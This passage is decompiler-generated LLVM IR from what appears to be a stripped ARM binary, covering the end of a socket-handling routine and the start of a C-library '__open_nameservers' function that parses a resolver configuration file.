  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_17e58 ], [ %stack_var_-212.1, %dec_label_pc_17fa0 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_17e58 ], [ %v1_17fa8, %dec_label_pc_17fa0 ]
  %v2_17fbc = sub i32 %stack_var_-192.0, %tmp155
  %v4_17fbc = xor i32 %stack_var_-192.0, %tmp155
  %v5_17fbc = xor i32 %v2_17fbc, %stack_var_-192.0
  %v6_17fbc = and i32 %v5_17fbc, %v4_17fbc
  %v5_17fc0 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_17fc0, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_17fb4
  %v7_17fc0 = load i32, i32* @fp, align 4
  %v8_17fc0 = sub i32 %v0_17e74, %v7_17fc0
  %v10_17fc0 = xor i32 %v7_17fc0, %v0_17e74
  %v11_17fc0 = xor i32 %v8_17fc0, %v0_17e74
  %v12_17fc0 = and i32 %v11_17fc0, %v10_17fc0
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_17fb4, %bb204
  %v1_17fc4.in = phi i32 [ %v6_17fbc, %dec_label_pc_17fb4 ], [ %v12_17fc0, %bb204 ]
  %v0_17fc4.in = phi i32 [ %v2_17fbc, %dec_label_pc_17fb4 ], [ %v8_17fc0, %bb204 ]
  %v0_17fc4 = icmp slt i32 %v0_17fc4.in, 0
  %v1_17fc4 = icmp slt i32 %v1_17fc4.in, 0
  %v2_17fc4 = xor i1 %v1_17fc4, %v0_17fc4
  br i1 %v2_17fc4, label %dec_label_pc_17e6c, label %dec_label_pc_17fc8

dec_label_pc_17fc8:                               ; preds = %dec_label_pc_17e9c, %bb203, %dec_label_pc_17f1c, %dec_label_pc_17ee8, %bb205
  %v1_17fcc = call i32 @__libc_close(i32 %v0_17cac)
  %v3_17fd0 = load i32, i32* %stack_var_0, align 4
  %v2_17fd4 = icmp eq i32 %v3_17fd0, 0
  br i1 %v2_17fd4, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_17fc8
  %v1_17fdc = load i32, i32* @r7, align 4
  %v3_17fd8 = inttoptr i32 %v3_17fd0 to i32*
  store i32 %v1_17fdc, i32* %v3_17fd8, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_17fc8
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 98276, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17fd4, i32 ptrtoint (i32* @global_var_14e1c.1293 to i32))
  %v2_17fe4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_17a78, i32* @r4, align 4
  %v1_17fec = call i32 @free(i32 %v2_17fe4)
  store i32 %v2_17a78, i32* @r0, align 4
  %v1_18004 = call i32 @__pthread_return_void()
  %v1_18014 = call i32 @__pthread_return_0()
  %v0_18020 = load i32, i32* @r6, align 4
  %v3_18020 = sdiv i32 %v0_18020, 256
  %v0_18024 = load i32, i32* @sl, align 4
  store i32 %v0_18024, i32* @global_var_2fb80.1279, align 4
  store i32 %v2_17a78, i32* @r0, align 4
  %v1_18030 = trunc i32 %v3_18020 to i8
  store i8 %v1_18030, i8* @global_var_298d5.1282, align 1
  %v1_18034 = trunc i32 %v0_18020 to i8
  store i8 %v1_18034, i8* bitcast (i8** @global_var_298d4.1281 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_18044.1294 to i32), i32* @lr, align 4
  %v1_18040 = call i32 @__pthread_return_void()
  %v0_181cc.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_181cc

dec_label_pc_18048:                               ; preds = %dec_label_pc_17cdc, %dec_label_pc_17cfc
  %v0_18048 = load i32, i32* @sl, align 4
  %v1_18048 = add i32 %v0_18048, 1
  %v2_18050 = srem i32 %v1_18048, %arg3
  store i32 %v2_18050, i32* @sl, align 4
  %v2_18054 = icmp eq i32 %v2_18050, 0
  br i1 %v2_18054, label %dec_label_pc_1805c, label %dec_label_pc_18114.backedge

dec_label_pc_1805c:                               ; preds = %dec_label_pc_18048
  %v1_18064 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_18118.outer.backedge

dec_label_pc_18118.outer.backedge:                ; preds = %dec_label_pc_1805c, %dec_label_pc_180f8, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_17df0, %.thread19 ], [ -1, %dec_label_pc_180f8 ], [ -1, %dec_label_pc_1805c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_18100, %dec_label_pc_180f8 ], [ %v1_18064, %dec_label_pc_1805c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_17afc.lr.ph, label %dec_label_pc_18134

dec_label_pc_18074:                               ; preds = %dec_label_pc_17f6c
  %v1_18074 = inttoptr i32 %v0_17f6c to i32*
  %v2_18074 = load i32, i32* %v1_18074, align 4
  %v1_18078 = call i32 @free(i32 %v2_18074)
  br label %dec_label_pc_1807c

dec_label_pc_1807c:                               ; preds = %dec_label_pc_17e0c, %dec_label_pc_17d60, %dec_label_pc_17e9c, %dec_label_pc_17e90, %dec_label_pc_17d78, %dec_label_pc_17d40, %dec_label_pc_18074
  br i1 %v2_18080, label %dec_label_pc_18088, label %dec_label_pc_180e4

dec_label_pc_18088:                               ; preds = %dec_label_pc_1807c
  store i32 %v2_17a78, i32* @r5, align 4
  store i32 %v2_17a78, i32* @r0, align 4
  %v1_180a0 = call i32 @__pthread_return_void()
  %v1_180b0 = call i32 @__pthread_return_0()
  %v2_180bc = load i32, i32* @global_var_2fc50.1287, align 4
  store i32 %v2_17a78, i32* @r0, align 4
  %v1_180cc = call i32 @__pthread_return_void()
  %v1_180d4 = add i32 %v2_180bc, -1
  store i32 %v1_180d4, i32* @r4, align 4
  %v5_180dc = icmp slt i32 %v6_180dc, %v1_180d4
  br i1 %v5_180dc, label %.thread27, label %dec_label_pc_180e4

.thread27:                                        ; preds = %dec_label_pc_18088
  %v7_180dc = add i32 %v6_180dc, 1
  br label %dec_label_pc_18114.backedge

dec_label_pc_180e4:                               ; preds = %dec_label_pc_18088, %dec_label_pc_1807c
  %v0_180e4 = load i32, i32* @sl, align 4
  %v1_180e4 = add i32 %v0_180e4, 1
  %v2_180ec = srem i32 %v1_180e4, %arg3
  store i32 %v2_180ec, i32* @sl, align 4
  %v2_180f0 = icmp eq i32 %v2_180ec, 0
  br i1 %v2_180f0, label %dec_label_pc_180f8, label %dec_label_pc_18114.backedge

dec_label_pc_180f8:                               ; preds = %dec_label_pc_180e4
  %v1_18100 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_18118.outer.backedge

dec_label_pc_18114.backedge:                      ; preds = %dec_label_pc_18048, %dec_label_pc_180e4, %.thread27
  %storemerge87 = phi i32 [ %v7_180dc, %.thread27 ], [ -1, %dec_label_pc_180e4 ], [ -1, %dec_label_pc_18048 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_17afc.lr.ph.preheader, label %dec_label_pc_18134

dec_label_pc_17afc.lr.ph.preheader:               ; preds = %dec_label_pc_17afc.lr.ph.preheader.lr.ph, %dec_label_pc_18114.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_17afc.lr.ph.preheader.lr.ph ], [ %v0_17cac, %dec_label_pc_18114.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_17af4, %dec_label_pc_17afc.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_18114.backedge ]
  %v0_18114259 = phi i32 [ -1, %dec_label_pc_17afc.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_18114.backedge ]
  br label %dec_label_pc_17afc.lr.ph

dec_label_pc_17afc.lr.ph:                         ; preds = %dec_label_pc_17afc.lr.ph.preheader, %dec_label_pc_18118.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_17cac, %dec_label_pc_18118.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_17afc.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_18118.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_17afc.lr.ph.preheader ]
  %v6_180dc = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_18118.outer.backedge ], [ %v0_18114259, %dec_label_pc_17afc.lr.ph.preheader ]
  %v1_17ba4 = icmp slt i32 %v6_180dc, 0
  %v4_17be0 = mul i32 %v6_180dc, 4
  %v5_17be0 = add i32 %v4_17be0, ptrtoint (i32* @global_var_2fc30.1291 to i32)
  %v6_17be0 = inttoptr i32 %v5_17be0 to i32*
  br label %dec_label_pc_17afc

dec_label_pc_18128:                               ; preds = %bb195, %.thread8, %dec_label_pc_17a54, %dec_label_pc_17a48
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_18134

dec_label_pc_18134:                               ; preds = %dec_label_pc_17a64, %dec_label_pc_18114.backedge, %dec_label_pc_18118.outer.backedge, %bb200, %dec_label_pc_17bec, %dec_label_pc_18118.backedge, %dec_label_pc_18128
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_18128 ], [ %v0_17cac, %dec_label_pc_18118.backedge ], [ %v1_17b04, %dec_label_pc_17bec ], [ %v1_17b04, %bb200 ], [ %v0_17cac, %dec_label_pc_18118.outer.backedge ], [ -1, %dec_label_pc_17a64 ], [ %v0_17cac, %dec_label_pc_18114.backedge ]
  %v0_18134 = call i32 @__GI___h_errno_location()
  %v2_1813c = inttoptr i32 %v0_18134 to i32*
  store i32 -1, i32* %v2_1813c, align 4
  %v0_18140 = load i32, i32* @sb, align 4
  store i32 %v0_18140, i32* @r6, align 4
  br label %dec_label_pc_18144

dec_label_pc_18144:                               ; preds = %dec_label_pc_17e30, %dec_label_pc_18134
  %v1_1814c = phi i32 [ %stack_var_-216.2, %dec_label_pc_18134 ], [ %v0_17cac, %dec_label_pc_17e30 ]
  %v7_18148 = icmp eq i32 %v1_1814c, -1
  br i1 %v7_18148, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_18144
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_18144, %bb208
  store i32 98644, i32* @lr, align 4
  %v1_18150 = xor i1 %v7_18148, true
  call void @__pseudo_cond_branch(i1 %v1_18150, i32 ptrtoint (i32* @global_var_127b4.1284 to i32))
  %v2_18154 = load i32, i32* %stack_var_-236, align 4
  %v1_18158 = call i32 @free(i32 %v2_18154)
  %v0_1815c = load i32, i32* @r7, align 4
  %v1_18160 = call i32 @free(i32 %v0_1815c)
  %v0_18164 = load i32, i32* @sl, align 4
  %v7_18164 = icmp eq i32 %v0_18164, -1
  br i1 %v7_18164, label %bb210, label %dec_label_pc_18170

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_181cc

dec_label_pc_18170:                               ; preds = %bb209
  %v2_18170 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_18170, i32* @r0, align 4
  %v1_18188 = call i32 @__pthread_return_void()
  %v1_18198 = call i32 @__pthread_return_0()
  %v0_181a4 = load i32, i32* @r6, align 4
  %v3_181a4 = sdiv i32 %v0_181a4, 256
  %v0_181a8 = load i32, i32* @sl, align 4
  store i32 %v0_181a8, i32* @global_var_2fb80.1279, align 4
  store i32 %v2_18170, i32* @r0, align 4
  %v1_181b4 = trunc i32 %v3_181a4 to i8
  store i8 %v1_181b4, i8* @global_var_298d5.1282, align 1
  %v1_181b8 = trunc i32 %v0_181a4 to i8
  store i8 %v1_181b8, i8* bitcast (i8** @global_var_298d4.1281 to i8*), align 4
  store i32 98760, i32* @lr, align 4
  %v1_181c4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_181cc

dec_label_pc_181cc:                               ; preds = %bb210, %bb207, %dec_label_pc_18170
  %v0_181cc = phi i32 [ %v0_18164, %bb210 ], [ %v0_181cc.pre, %bb207 ], [ -1, %dec_label_pc_18170 ]
  store i32 %v3_17a00, i32* @r4, align 4
  store i32 %v6_17a00, i32* @r5, align 4
  store i32 %v9_17a00, i32* @r6, align 4
  store i32 %v12_17a00, i32* @r7, align 4
  store i32 %v15_17a00, i32* @r8, align 4
  store i32 %v18_17a00, i32* @sb, align 4
  store i32 %v21_17a00, i32* @sl, align 4
  ret i32 %v0_181cc

; uselistorder directives
  uselistorder i32 %v0_181a4, { 1, 0 }
  uselistorder i32 %v0_18164, { 1, 0 }
  uselistorder i1 %v7_18148, { 1, 0 }
  uselistorder i32 %v6_180dc, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_18020, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_17e74, { 0, 1, 3, 2 }
  uselistorder i32 %v0_17f6c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_17f2c, { 1, 0 }
  uselistorder i32 %v0_17e4c, { 1, 0 }
  uselistorder i32 %v0_17e50, { 1, 0 }
  uselistorder i32 %v5_17d50, { 1, 0 }
  uselistorder i32 %v0_17cac, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_17c18, { 1, 0 }
  uselistorder i32 %v2_17bb8, { 1, 0 }
  uselistorder i32 %v1_17b30, { 1, 2, 0 }
  uselistorder i1 %v7_17b00, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_17b04, { 1, 2, 0 }
  uselistorder i32 %v0_17af4, { 1, 0 }
  uselistorder i32 %v2_17a78, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_recv, { 4, 0, 1, 2, 3 }
  uselistorder i32 10000, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 11, 6, 0, 1, 2, 3, 4, 5, 8, 9, 10, 7 }
  uselistorder i32 101, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 4, 1, 2, 0, 3, 5 }
  uselistorder i32 ()* @socket, { 1, 7, 5, 4, 3, 2, 6, 0 }
  uselistorder i32 (i32)* @inet_addr, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_298d5.1282, { 2, 1, 0 }
  uselistorder i32 512, { 9, 22, 4, 23, 3, 18, 19, 20, 21, 0, 6, 5, 12, 14, 11, 15, 10, 16, 17, 2, 8, 7, 1, 13 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_181cc, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_18144, { 1, 0 }
  uselistorder label %dec_label_pc_18134, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_18128, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_17afc.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18114.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1807c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_18118.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18048, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_17fc8, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_17fb4, { 1, 0 }
  uselistorder label %dec_label_pc_17fa0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17f9c, { 1, 0 }
  uselistorder label %dec_label_pc_17f04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17e40, { 1, 0 }
  uselistorder label %dec_label_pc_17e30, { 1, 0 }
  uselistorder label %dec_label_pc_18118.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17c98, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_17bec, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_181d8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_181d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_181d8, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_181d8
  %v5_181d8 = mul i32 %arg2, 256
  %v6_181d8 = and i32 %v5_181d8, %arg1
  store i32 %v6_181d8, i32* %r0.global-to-local, align 4
  %v2_181dc = load i32, i32* @r8, align 4
  %v3_181dc = udiv i32 %v2_181dc, 4194304
  %v4_181dc = mul i32 %v2_181dc, 1024
  %v5_181dc = or i32 %v3_181dc, %v4_181dc
  %v8_181dc = and i32 %v5_181dc, %arg3
  call void @__pseudo_branch(i32 %v8_181dc)
  %v0_18208.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_18208 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_18208.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_181d8, %bb
  %v10_18208 = phi i32 [ %arg1, %dec_label_pc_181d8 ], [ %v1_18208, %bb ], [ %v1_18208, %.thread ]
  ret i32 %v10_18208

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1820c = load i32, i32* @r4, align 4
  store i32 %v3_1820c, i32* %stack_var_-28, align 4
  %v6_1820c = load i32, i32* @r5, align 4
  %v9_1820c = load i32, i32* @r6, align 4
  %v12_1820c = load i32, i32* @r7, align 4
  %v15_1820c = load i32, i32* @r8, align 4
  %v18_1820c = load i32, i32* @sl, align 4
  %v2_18210 = ptrtoint i32* %stack_var_-192 to i32
  %v2_18214 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_18214, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_298d8.1114 to i32), i32* %r2.global-to-local, align 4
  %v1_18228 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_298d8.1114 to i32), i32* %r0.global-to-local, align 4
  store i32 98876, i32* @lr, align 4
  %v1_18238 = call i32 @__pthread_return_0()
  store i32 %v1_18238, i32* %r0.global-to-local, align 4
  %v2_18240 = load i32, i32* @global_var_2fc4c.1119, align 4
  %v5_18248 = icmp sgt i32 %v2_18240, 0
  br i1 %v5_18248, label %dec_label_pc_18484, label %dec_label_pc_1824c

dec_label_pc_1824c:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_20f14.1301 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_20f28.1303 to i32), i32* @r1, align 4
  %v3_18254 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_20f14.1301 to i32), i32 ptrtoint (i32* @global_var_20f28.1303 to i32))
  store i32 %v3_18254, i32* %r0.global-to-local, align 4
  store i32 %v3_18254, i32* @sl, align 4
  %v2_18258 = icmp eq i32 %v3_18254, 0
  br i1 %v2_18258, label %dec_label_pc_18260, label %dec_label_pc_1844c.preheader

dec_label_pc_18260:                               ; preds = %dec_label_pc_1824c
  store i32 ptrtoint ([24 x i8]* @global_var_20f2c.1305 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_20f28.1303 to i32), i32* @r1, align 4
  %v3_18268 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_20f2c.1305 to i32), i32 ptrtoint (i32* @global_var_20f28.1303 to i32))
  store i32 %v3_18268, i32* %r0.global-to-local, align 4
  store i32 %v3_18268, i32* @sl, align 4
  %v2_1826c = icmp eq i32 %v3_18268, 0
  br i1 %v2_1826c, label %dec_label_pc_18478, label %dec_label_pc_1844c.preheader

dec_label_pc_1844c.preheader:                     ; preds = %dec_label_pc_1824c, %dec_label_pc_18260
  %v0_1845426 = phi i32 [ %v3_18254, %dec_label_pc_1824c ], [ %v3_18268, %dec_label_pc_18260 ]
  %v2_182c0 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1835c = inttoptr i32 %tmp to i8*
  store i32 %v2_18210, i32* %r0.global-to-local, align 4
  store i32 %v0_1845426, i32* %r2.global-to-local, align 4
  %v3_1845866 = call i32 @fgets(i32 %v2_18210, i32 128, i32 %v0_1845426)
  store i32 %v3_1845866, i32* %r0.global-to-local, align 4
  %v2_1845c68 = icmp eq i32 %v3_1845866, 0
  store i32 %v2_18210, i32* @r4, align 4
  br i1 %v2_1845c68, label %dec_label_pc_1846c, label %dec_label_pc_1827c.preheader.lr.ph

dec_label_pc_1827c.preheader.lr.ph:               ; preds = %dec_label_pc_1844c.preheader
  %v1_1827c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_1827c.preheader

dec_label_pc_18278:                               ; preds = %dec_label_pc_18288
  %v1_18278 = add i32 %v0_18278, 1
  store i32 %v1_18278, i32* %r0.global-to-local, align 4
  %v1_1827c = inttoptr i32 %v1_18278 to i8*
  %v2_1827c = load i8, i8* %v1_1827c, align 1
  %v3_1827c = zext i8 %v2_1827c to i32
  store i32 %v3_1827c, i32* %r2.global-to-local, align 4
  %v2_18280 = icmp eq i8 %v2_1827c, 0
  br i1 %v2_18280, label %dec_label_pc_1829c, label %dec_label_pc_18288

dec_label_pc_18288:                               ; preds = %dec_label_pc_18288.lr.ph, %dec_label_pc_18278
  %v0_18278 = phi i32 [ %v2_18210, %dec_label_pc_18288.lr.ph ], [ %v1_18278, %dec_label_pc_18278 ]
  %v1_18290 = phi i32 [ %v3_1827c13, %dec_label_pc_18288.lr.ph ], [ %v3_1827c, %dec_label_pc_18278 ]
  %v3_18290 = mul nuw nsw i32 %v1_18290, 2
  %v4_18290 = add i32 %v3_18290, %v2_1828c.pre
  %v5_18290 = inttoptr i32 %v4_18290 to i8*
  %v6_18290 = load i8, i8* %v5_18290, align 1
  %v1_18294 = and i8 %v6_18290, 32
  %v2_18294 = icmp eq i8 %v1_18294, 0
  br i1 %v2_18294, label %dec_label_pc_1829c, label %dec_label_pc_18278

dec_label_pc_1829c:                               ; preds = %dec_label_pc_18278, %dec_label_pc_18288, %dec_label_pc_1827c.preheader
  %v0_1833435 = phi i32 [ %v2_18210, %dec_label_pc_1827c.preheader ], [ %v1_18278, %dec_label_pc_18278 ], [ %v0_18278, %dec_label_pc_18288 ]
  %v0_182b0 = phi i32 [ %v3_1827c13, %dec_label_pc_1827c.preheader ], [ %v3_1827c, %dec_label_pc_18278 ], [ %v1_18290, %dec_label_pc_18288 ]
  %v7_1829c = icmp eq i32 %v0_182b0, 10
  br i1 %v7_1829c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_1829c
  %v3_182a0 = icmp eq i32 %v0_182b0, 0
  br i1 %v3_182a0, label %bb55, label %dec_label_pc_182b0

.thread3:                                         ; preds = %dec_label_pc_1829c
  br label %dec_label_pc_1844c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_1844c.backedge

dec_label_pc_1844c.backedge:                      ; preds = %dec_label_pc_18428, %dec_label_pc_18440, %bb55, %dec_label_pc_183c0, %.thread3, %dec_label_pc_182b0
  %v0_18454.pre = load i32, i32* @sl, align 4
  store i32 %v2_18210, i32* %r0.global-to-local, align 4
  store i32 %v0_18454.pre, i32* %r2.global-to-local, align 4
  %v3_18458 = call i32 @fgets(i32 %v2_18210, i32 128, i32 %v0_18454.pre)
  store i32 %v3_18458, i32* %r0.global-to-local, align 4
  %v2_1845c = icmp eq i32 %v3_18458, 0
  store i32 %v2_18210, i32* @r4, align 4
  br i1 %v2_1845c, label %dec_label_pc_1846c, label %dec_label_pc_1827c.preheader

dec_label_pc_182b0:                               ; preds = %bb
  %v7_182b0 = icmp eq i32 %v0_182b0, 35
  br i1 %v7_182b0, label %dec_label_pc_1844c.backedge, label %dec_label_pc_18334

dec_label_pc_182c0:                               ; preds = %bb58
  store i32 %v2_182c0, i32* %r2.global-to-local, align 4
  %v4_182c4 = mul i32 %storemerge, 4
  %v5_182c4 = add i32 %v4_182c4, %v2_182c0
  %v2_182c8 = add i32 %v5_182c4, -36
  %v3_182c8 = inttoptr i32 %v2_182c8 to i32*
  store i32 %v0_182c8, i32* %v3_182c8, align 4
  %v0_182d415 = load i32, i32* %r0.global-to-local, align 4
  %v1_182d416 = inttoptr i32 %v0_182d415 to i8*
  %v2_182d417 = load i8, i8* %v1_182d416, align 1
  %v3_182d418 = zext i8 %v2_182d417 to i32
  store i32 %v3_182d418, i32* %r2.global-to-local, align 4
  %v2_182d819 = icmp eq i8 %v2_182d417, 0
  br i1 %v2_182d819, label %dec_label_pc_18308.preheader, label %dec_label_pc_182e0.lr.ph

dec_label_pc_182e0.lr.ph:                         ; preds = %dec_label_pc_182c0
  %v2_182e4.pre = load i32, i32* @global_var_29594, align 4
  br label %dec_label_pc_182e0

dec_label_pc_182d0:                               ; preds = %dec_label_pc_182f4
  %v1_182d0 = add i32 %v0_182d0, 1
  store i32 %v1_182d0, i32* %r0.global-to-local, align 4
  %v1_182d4 = inttoptr i32 %v1_182d0 to i8*
  %v2_182d4 = load i8, i8* %v1_182d4, align 1
  %v3_182d4 = zext i8 %v2_182d4 to i32
  store i32 %v3_182d4, i32* %r2.global-to-local, align 4
  %v2_182d8 = icmp eq i8 %v2_182d4, 0
  br i1 %v2_182d8, label %dec_label_pc_18308.preheader, label %dec_label_pc_182e0

dec_label_pc_182e0:                               ; preds = %dec_label_pc_182e0.lr.ph, %dec_label_pc_182d0
  %v0_182d0 = phi i32 [ %v0_182d415, %dec_label_pc_182e0.lr.ph ], [ %v1_182d0, %dec_label_pc_182d0 ]
  %v0_182f4 = phi i32 [ %v3_182d418, %dec_label_pc_182e0.lr.ph ], [ %v3_182d4, %dec_label_pc_182d0 ]
  %v3_182e8 = mul nuw nsw i32 %v0_182f4, 2
  %v4_182e8 = add i32 %v3_182e8, %v2_182e4.pre
  %v5_182e8 = inttoptr i32 %v4_182e8 to i8*
  %v6_182e8 = load i8, i8* %v5_182e8, align 1
  %v1_182ec = and i8 %v6_182e8, 32
  %v2_182ec = icmp eq i8 %v1_182ec, 0
  br i1 %v2_182ec, label %dec_label_pc_182f4, label %dec_label_pc_18308.preheader

dec_label_pc_182f4:                               ; preds = %dec_label_pc_182e0
  %v7_182f4 = icmp eq i32 %v0_182f4, 10
  br i1 %v7_182f4, label %dec_label_pc_18308.preheader, label %dec_label_pc_182d0

dec_label_pc_18308.preheader:                     ; preds = %dec_label_pc_182f4, %dec_label_pc_182e0, %dec_label_pc_182d0, %dec_label_pc_182c0
  %v0_1830820 = phi i32 [ %v0_182d415, %dec_label_pc_182c0 ], [ %v0_182d0, %dec_label_pc_182f4 ], [ %v0_182d0, %dec_label_pc_182e0 ], [ %v1_182d0, %dec_label_pc_182d0 ]
  %v1_1830821 = inttoptr i32 %v0_1830820 to i8*
  %v2_1830822 = load i8, i8* %v1_1830821, align 1
  %v3_1830823 = zext i8 %v2_1830822 to i32
  store i32 %v3_1830823, i32* %r2.global-to-local, align 4
  %v2_1830c24 = icmp eq i8 %v2_1830822, 0
  br i1 %v2_1830c24, label %dec_label_pc_18330, label %dec_label_pc_18314

dec_label_pc_18300:                               ; preds = %dec_label_pc_18314, %dec_label_pc_18328
  %v3_18304 = inttoptr i32 %v2_18304 to i8*
  store i8 0, i8* %v3_18304, align 1
  %v4_18304 = load i32, i32* %r0.global-to-local, align 4
  %v5_18304 = add i32 %v4_18304, 1
  store i32 %v5_18304, i32* %r0.global-to-local, align 4
  %v1_18308 = inttoptr i32 %v5_18304 to i8*
  %v2_18308 = load i8, i8* %v1_18308, align 1
  %v3_18308 = zext i8 %v2_18308 to i32
  store i32 %v3_18308, i32* %r2.global-to-local, align 4
  %v2_1830c = icmp eq i8 %v2_18308, 0
  br i1 %v2_1830c, label %dec_label_pc_18330, label %dec_label_pc_18314

dec_label_pc_18314:                               ; preds = %dec_label_pc_18308.preheader, %dec_label_pc_18300
  %v0_18328 = phi i32 [ %v3_18308, %dec_label_pc_18300 ], [ %v3_1830823, %dec_label_pc_18308.preheader ]
  %v2_18304 = phi i32 [ %v5_18304, %dec_label_pc_18300 ], [ %v0_1830820, %dec_label_pc_18308.preheader ]
  %v2_18318 = load i32, i32* @global_var_29594, align 4
  %v3_1831c = mul nuw nsw i32 %v0_18328, 2
  %v4_1831c = add i32 %v2_18318, %v3_1831c
